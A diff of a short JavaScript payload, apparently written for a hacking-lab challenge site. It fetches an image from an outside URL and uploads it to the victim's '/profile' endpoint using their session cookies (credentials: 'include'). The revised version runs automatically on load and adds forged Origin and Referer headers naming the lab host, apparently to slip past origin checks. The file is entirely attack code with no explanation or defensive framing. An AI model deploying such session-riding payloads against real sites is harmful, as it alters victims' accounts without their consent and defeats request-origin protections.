@@ -1,22 +1,33 @@
-var imgURL = 'https://chl-d8ec59b9-1c66-4864-9d89-f9e178064508-blog-hacklab.softwareseguro.com.ar/static/uploads/93628e27ea067070.jpg';
+var imgURL = 'https://www.webempresa.com/foro/wp-content/uploads/wpforo/attachments/3200/318277=80538-Sin_imagen_disponible.jpg';
 
-fetch(imgURL)
-  .then(response => response.blob())
-  .then(blob => {
-    var formData = new FormData();
-    formData.append('profile_pic', blob, 'newprofile.jpg');
 
-    return fetch('/profile', {
-      method: 'POST',
-      body: formData,
-      credentials: 'include'
-    });
-  })
-  .then(response => {
-    if (response.ok) {
-      console.log('Imagen de perfil actualizada con éxito.');
-    } else {
-      console.error('Error al subir la imagen.');
+async function cambiarImagenPerfil() {
+    try {
+        
+        const response = await fetch(imgURL);
+        const blob = await response.blob();
+
+        
+        const formData = new FormData();
+        formData.append('profile_pic', blob, 'new_profile.jpg');
+
+        headers = {
+          "Origin": "https://chl-a462b31e-e114-45ad-8452-0a5bbee78373-blog-hacklab.softwareseguro.com.ar",
+          "Referer": "https://chl-a462b31e-e114-45ad-8452-0a5bbee78373-blog-hacklab.softwareseguro.com.ar/profile"
+        }
+        
+        await fetch('/profile', {
+            method: 'POST',
+            body: formData,
+            headers: headers,
+            credentials: 'include' 
+        });
+
+        console.log('Imagen de perfil cambiada con éxito.');
+    } catch (error) {
+        console.error('Error al cambiar la imagen de perfil:', error);
     }
-  })
-  .catch(error => console.error('Error:', error));
+}
+
+
+cambiarImagenPerfil();
